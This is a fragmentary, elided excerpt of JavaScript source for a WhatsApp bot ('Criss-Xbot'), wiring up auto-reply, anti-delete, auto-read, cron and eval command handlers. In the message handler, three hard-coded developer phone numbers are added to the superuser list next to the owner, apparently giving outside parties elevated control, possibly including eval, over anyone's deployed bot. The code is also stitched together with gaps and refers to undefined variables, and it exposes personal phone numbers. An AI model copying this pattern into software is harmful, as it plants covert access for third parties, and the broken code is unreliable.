...
const handleCall = require("./works/anticall"); 
//import chalk from 'chalk'
const autobio = require("./works/autobio");
const handleStatus = require("./works/statushandle");
const handleGroupParticipantsUpdate = require("./works/events");
const handleAutoReply = require("./works/greet");
const handleAntiDelete = require("./works/antidelete");
const handleAntiLink = require("./works/antilink");
const handleEvalCommand = require('./works/eval');
const handleAutoBlock = require('./works/autoblock');
const handleAntiLinkBadWordsAndTags = require("./works/groupcontrol");
const handleAutoReact = require("./works/autoreact");
const { activateCrons, handleContactsUpsert } = require('./works/crons'); 
const handleAutoRead = require("./works/autoread");
const handleAutoLikeStatus = require("./works/autolikestatus");
//import chalk from 'chalk'
const { verifierEtatJid , recupererActionJid } = require("./bdd/antilien");
const { atbverifierEtatJid , atbrecupererActionJid } = require("./bdd/antibot");
let evt = require(__dirname + "/ezrah/fredi");
const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./bdd/banUser");
const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd/banGroup");
const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
//const //{loadCmd}=require("/ezrah/mesfonctions")
let { reagir } = require(__dirname + "/ezrah/app");
var session = conf.session.replace(/FREDI-XBOT;;;=>/g,"");
...
setTimeout(() => {
    async function main() {
        ...
        const sockOptions = {
            ...
            browser: ['Criss-Xbot', "safari", "1.0.0"],
...
zk.ev.on('call', async (callData) => {
  ...
  await handleAntiDelete(zk, conf, m);
        ...
        zk.ev.on("messages.upsert", async (m) => {
            ...
            /* const luckymd='255752593977';
             const fredi='255620814108';
             const frediezra='255764182801'*/
            /*  var superUser=[servBot,luckymd, fredi,frediezra].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
              var dev =[luckymd, fredi,frediezra].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
            ...
            const luckymd = '255752593977';
            const criss = '255687068672';
            const frediezra = "255764182801";
            const sudo = await getAllSudoNumbers();
            const superUserNumbers = [servBot, luckymd, criss, frediezra, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers.concat(sudo);
            const superUser = allAllowedNumbers.includes(auteurMessage);
            
            var dev = [luckymd, fredi,frediezra,Sams].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
            function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
            console.log("\t [][]...{CRISS-XBOT}...[][]");
      ...
      await zk.sendMessage(origineMessage, { delete: key });
        ...
        console.log('.... ' + er);
            ...
            //execution des commandes   
             if (verifCom) {
        const cd = evt.cm.find(fredi => fredi.nomCom === com || fredi.nomCom === com || fredi.aliases && fredi.aliases.includes(com));
        if (cd) {
          try {
    ...
    async  function activateCrons() {
        ...
        zk.ev.on("connection.update", async (con) => {
            ...
            if (connection === "connecting") {
                console.log("ℹ️ Fredi is connecting to your account...");
            }
  ...
  ephemeralExpiration: 5
        ...
        zk.awaitForMessage = async (options = {}) =>{
            return new Promise((resolve, reject) => {
                ...
                app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, 'ezrah', 'index.html'));
});
